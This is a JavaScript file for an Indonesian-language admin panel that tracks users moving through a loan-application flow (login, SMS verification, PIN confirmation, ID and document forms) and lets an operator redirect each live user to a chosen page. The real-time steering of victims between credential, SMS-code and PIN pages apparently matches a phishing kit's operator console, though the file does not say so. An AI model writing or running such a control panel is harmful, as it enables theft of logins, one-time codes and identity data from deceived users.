(() => {
  'use strict';
  const rows = document.getElementById('rows'), search = document.getElementById('search');
  const SAFE = [
    ['', 'Tanpa target'],
    ['form-nik.html','Form Identitas'],
    ['upload-dokumen.html','Upload'],
    ['form-pinjaman.html','Form Pinjaman'],
    ['ringkasan-pengajuan.html','Ringkasan'],
    ['proses-pengajuan.html','Proses Pengajuan'],
    ['hasil-pengajuan.html','Hasil Pengajuan'],
    ['dashboard-pinjaman.html','Dashboard']
  ];
  const LABEL = Object.fromEntries([...SAFE, ['index.html','Login'], ['verifikasi-sms.html','Verifikasi'], ['konfirmasi-pin.html','Konfirmasi']]);
  let users = [], csrf = '';
  const esc = s => String(s??'').replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
  const age = value => { const t=Date.parse(value); if(!t)return '-'; const s=Math.max(0,Math.floor((Date.now()-t)/1000)); return s<60?`${s} dtk lalu`:s<3600?`${Math.floor(s/60)} mnt lalu`:`${Math.floor(s/3600)} jam lalu`; };
  const isOnline = u => Date.now()-Date.parse(u.lastSeen||0)<45000;
  function toast(t){const e=document.getElementById('toast');e.textContent=t;e.style.display='block';setTimeout(()=>e.style.display='none',2200);}
  async function auth(){const r=await fetch('/api/admin-auth',{cache:'no-store'});if(!r.ok){location.replace('/admin/login.html');return false;}const m=document.cookie.match(/(?:^|; )kb_admin_csrf=([^;]+)/);csrf=m?decodeURIComponent(m[1]):'';return true;}
  function render(){const q=search.value.trim().toLowerCase();const list=users.filter(u=>[u.username,u.fullName,u.status,u.currentPage].join(' ').toLowerCase().includes(q));rows.innerHTML=list.map(u=>`<tr><td><strong>${esc(u.fullName||u.username)}</strong><br><small>${esc(u.username)}</small></td><td><span class="pill ${isOnline(u)?'online':''}">${isOnline(u)?'Online':'Offline'} · ${esc(u.status||'-')}</span></td><td>${esc(LABEL[u.currentPage]||u.currentPage||'-')}</td><td>${esc(age(u.lastSeen))}</td><td>${esc(LABEL[u.targetPage]||u.targetPage||'-')}</td><td><div class="target"><select data-key="${esc(u.key)}">${SAFE.map(([v,l])=>`<option value="${esc(v)}" ${u.targetPage===v?'selected':''}>${esc(l)}</option>`).join('')}</select><button data-save="${esc(u.key)}">Terapkan</button></div></td></tr>`).join('')||'<tr><td colspan="6">Tidak ada user.</td></tr>';
    document.getElementById('total').textContent=users.length;document.getElementById('online').textContent=users.filter(isOnline).length;document.getElementById('targets').textContent=users.filter(u=>u.targetPage).length;
  }
  async function load(){document.getElementById('status').textContent='Memuat…';const r=await fetch('/api/admin-users',{cache:'no-store'});if(r.status===401){location.replace('/admin/login.html');return;}const d=await r.json();users=d.users||[];render();document.getElementById('status').textContent=`Diperbarui ${new Date().toLocaleTimeString('id-ID')}`;}
  rows.addEventListener('click',async e=>{const key=e.target.dataset.save;if(!key)return;const sel=rows.querySelector(`select[data-key="${CSS.escape(key)}"]`);const r=await fetch('/api/admin-target',{method:'POST',headers:{'content-type':'application/json','x-csrf-token':csrf},body:JSON.stringify({userKey:key,targetPage:sel.value})});if(r.ok){toast('Target diperbarui');load();}else toast('Gagal memperbarui target');});
  search.addEventListener('input',render);document.getElementById('refresh').addEventListener('click',load);document.getElementById('logout').addEventListener('click',async()=>{await fetch('/api/admin-auth',{method:'DELETE'});location.replace('/admin/login.html');});
  (async()=>{if(await auth()){await load();setInterval(load,10000);}})();
})();
